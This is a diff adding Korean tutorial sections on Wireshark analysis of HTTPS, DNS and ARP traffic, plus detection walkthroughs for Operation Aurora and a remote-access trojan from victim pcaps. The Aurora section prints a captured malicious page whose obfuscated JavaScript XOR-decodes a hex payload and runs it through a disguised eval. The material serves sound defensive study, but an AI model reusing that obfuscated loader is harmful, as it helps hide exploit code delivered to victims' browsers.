@@ -21,6 +21,12 @@ tags:
 - [실시간패킷분석](#실시간패킷분석)
 - [HTTP 패킷분석](#http-패킷분석)
 - [TCP 패킷분석](#tcp-패킷분석)
+- [HTTPS 패킷분석](#https-패킷분석)
+- [UDP 패킷분석 - DNS 요청/응답](#udp-패킷분석---dns-요청응답)
+- [DNS 응답](#dns-응답)
+- [ARP 패킷분석](#arp-패킷분석)
+- [공격탐지#1 - 오퍼레이션 오로라](#공격탐지1---오퍼레이션-오로라)
+- [공격탐지#2 - 원격접속 트로이목마](#공격탐지2---원격접속-트로이목마)
 
 <!-- /TOC -->
 
@@ -129,6 +135,169 @@ tags:
     - #SEQ = 최근발신패킷의 #SEQ + data length
     - #ACK = 최근수신패킷의 #SEQ + data length
 - #SEQ, #ACK 계산과정
+    - ![](https://s26.postimg.org/4c3qyrd5l/screenshot_76.png)
+        - TCP 3-way handshake 분석 : #63 ~ #65
+        - TCP 데이타 송수신 : #66 ~ #68
+        - TCP 4-way teardown 분석 : #69 ~ #72
 
 
-<iframe src="https://onedrive.live.com/embed?cid=38EA1C4FEB17A7B9&resid=38EA1C4FEB17A7B9%2137191&authkey=AMqjDpdJNH8IJ0w&em=2" width="402" height="346" frameborder="0" scrolling="no"></iframe>
+# HTTPS 패킷분석
+- HTTPS 패킷캡쳐
+    - 크롬웹브라우져를 시작하면서 구글에 자동로그인할때 발생하는 패킷캡쳐
+    - ![](https://s26.postimg.org/qld2rkj89/screenshot_76.png)
+- 디스플레이 필터 설정
+    - tcp.port == 443 && ip.addr == 74.125.128.120
+    - HTTPS 표준포트는 443 이므로 이 포트만 필터링
+    - 여러서버에 요청을 하기 때문에 HTTPS 시퀀스 분석이 용이하게 74.125.128.120 서버와 통신했던 내역을 필터링
+- HTTPS 통신 시퀀스
+    - ![](https://s26.postimg.org/yqzq3gwux/screenshot_76.png)
+
+
+# UDP 패킷분석 - DNS 요청/응답
+- DNS 패킷캡쳐
+    - 노트북의 인터넷을 OFF 했다가 ON 하고나서 크롬웹브라우져로 구글검색을 시도하는 시나리오.
+    - 가장먼저 DNS 요청을 보내서 각 hostname을 ip address로 resolve하는 과정을 거치게 됨.
+    - DNS 요청/응답은 udp 패킷이며 port는 53이므로 필터식은 udp && udp.port == 53 가 됨.
+    - ![](https://s26.postimg.org/jyv0c4qxl/screenshot_76.png)
+- UDP 패킷헤더
+    - ![](https://s26.postimg.org/c7eadkms9/screenshot_76.png)
+- DNS 요청
+    - ![](https://s26.postimg.org/rhe5kriah/screenshot_76.png)
+
+| . | . |
+|---|---|
+| 패킷번호 | 19 |
+| DNS 패킷 타입 | 요청 |
+| NS 패킷 내용 | dns.msftncsi.com 의 ip address는 무엇인가? |
+
+
+
+# DNS 응답
+![](https://s26.postimg.org/wjvhfjrkp/screenshot_76.png)
+
+| . | . |
+|---|---|
+| 패킷번호 | 22 |
+| DNS 패킷 타입 | |응답 |
+| DNS 패킷 내용 | dns.msftncsi.com 의 ip address는 131.107.255.255 입니다. |
+
+
+
+# ARP 패킷분석
+- ARP 패킷캡쳐
+    - 노트북의 인터넷을 OFF 했다가 ON 하고나서 크롬웹브라우져로 구글검색을 시도하는 시나리오.
+    - 각 ip address에 해당하는 mac address를 검색하기 위해서 요청하고, 해당 ip address를 갖는 호스트는 자신의 mac address를 포함하여 응답함.
+    - ![](https://s26.postimg.org/3k5odayc9/screenshot_76.png)
+    - 필터식은 arp 프로토콜을 그대로 적어준다.
+    - ![](https://s26.postimg.org/o5kg57fx5/screenshot_76.png)
+- ARP 요청
+    - ![](https://s26.postimg.org/641b7elw9/screenshot_76.png)
+
+| . | . |
+|---|---|
+| #패킷번호 | 2 |
+| ARP 타입 | ARP 요청 |
+| 송신자 mac | 10:0b... |
+| 송신자 ip | 192.168.6.226 |
+| 내용 | 192.168.4.1 의 mac 은 무엇인가? |
+
+- ARP 응답
+     - ![](https://s26.postimg.org/jni5d3zvd/screenshot_76.png)
+
+| . | . |
+|---|---|
+| #패킷번호 | 3 |
+| ARP 타입 | ARP 응답 |
+| 송신자 mac | a8:d0... |
+| 송신자 ip | 192.168.4.1 |
+| 내용 | 192.168.4.1 의 mac 은 a8:d0... 입니다. |
+
+
+# 공격탐지#1 - 오퍼레이션 오로라
+- 2010년 1월 버전 IE의 취약점을 이용한 원격루트제어 획득
+- 희생자 PC에서 캡쳐한 pcap 로드
+    - aurora.pcap
+        - ![](https://s26.postimg.org/jos36j1p5/screenshot_76.png)
+    - 첫번째 요청/응답
+        - ![](https://s26.postimg.org/584tryc7t/screenshot_76.png)
+    - 두번째 요청/응답
+        
+```html
+GET /info?rFfWELUjLJHpP HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: 192.168.100.202
+Connection: Keep-Alive
+   
+HTTP/1.1 200 OK
+Content-Type: text/html
+Pragma: no-cache
+Connection: Keep-Alive
+Server: Apache
+Content-Length: 11266
+   
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
+<html>
+<head>
+<script>
+..var IwpVuiFqihVySoJStwXmT = '04271477133b000b1a0c240339133c120e2805160e1503684d705005291a08091b3e6e713e1122520b03123d051808392c0d27123b0a0805033c1c073532
+...
+3b0233372a033a2022215131';
+..var RXb = '';
+..for (i = 0;i<IwpVuiFqihVySoJStwXmT.length;i+=2) {
+...RXb += String.fromCharCode(parseInt(IwpVuiFqihVySoJStwXmT.substring(i, i+2), 16));
+..}
+..var vuWGWsvUonxrQzpqgBXPrZNSKRGee = location.search.substring(1);
+..var NqxAXnnXiILOBMwVnKoqnbp = '';
+..for (i=0;i<RXb.length;i++) {
+...NqxAXnnXiILOBMwVnKoqnbp += String.fromCharCode(RXb.charCodeAt(i) ^ vuWGWsvUonxrQzpqgBXPrZNSKRGee.charCodeAt(i%vuWGWsvUonxrQzpqgBXPrZNSKRGee.length));
+..}
+..window["eval".replace(/[A-Z]/g,"")](NqxAXnnXiILOBMwVnKoqnbp);
+   
+</script>
+</head>
+<body>
+<span id="vhQYFCtoDnOzUOuxAflDSzVMIHYhjJojAOCHNZtQdlxSPFUeEthCGdRtiIY"><iframe src="/infowTVeeGDYJWNfsrdrvXiYApnuPoCMjRrSZuKtbVgwuZCXwxKjtEclbPuJPPctcflhsttMRrSyxl.gif" onload="WisgEgTNEfaONekEqaMyAUALLMYW(event)" /></span></body></html>
+</body>
+</html>
+```
+
+    - 공격자사이트#2가 위장된 javascript 코드와 iframe에 쌓여있는 GIF 이미지 응답
+
+- 세번째 요청/응답
+    - ![](https://s26.postimg.org/ccmn0zjh5/screenshot_76.png)
+        - 희생자는 GIF 이미지에 GET 요청
+        - 희생자PC에서 GIF 이미지가 위장된 javascript 코드와 결합하여 실행됨.
+- 네번째, 다섯번째 요청/응답
+    - ![](https://s26.postimg.org/ewmv8twex/screenshot_76.png)
+        - 희생자PC와 공격자서버가 새로운 TCP 세션을 생성
+        - 희생자는 이 세션으로 셸 정보를 전송
+
+
+
+
+
+
+# 공격탐지#2 - 원격접속 트로이목마
+- 희생자 PC에서 캡쳐한 pcap 로드
+    - ratinfected.pcap
+        - ![](https://s26.postimg.org/uje4m7a6x/screenshot_76.png)
+- 첫번째 TCP 스트림 분석
+    - 희생자가 자신의 OS 스펙을 공격자로 전송하고 있음.
+        - ![](https://s26.postimg.org/4p4bwfa6x/screenshot_76.png)
+- 두번째 TCP 스트림 분석
+- 세번째 TCP 스트림 분석
+    - 희생자가 공격자에게 대용량 데이타 전송을 수행했음.
+    - jpgevhook 이란 단어로 보아 데이타의 내용은 이미지파일인가?
+        - ![](https://s26.postimg.org/le5rsc6s9/screenshot_76.png)
+- 세번째 스트림의 내용을 파일로 저장
+    - troy.dat 로 저장
+    - ![](https://s26.postimg.org/54flpfw49/screenshot_76.png)
+- winhex를 이용해서 이미지헤더가 아닌것 같은 부분을 살살 잘라냄.
+    - ![](https://s26.postimg.org/67zq1egrd/screenshot_76.png)
+- troy.dat를 그림판으로 오픈
+    - 희생자의 PC가 계속 화면캡쳐당했고, 캡쳐된 이미지가 서버로 전송되고 있음.
+    - ![](https://s26.postimg.org/whksk72op/screenshot_76.png)
+
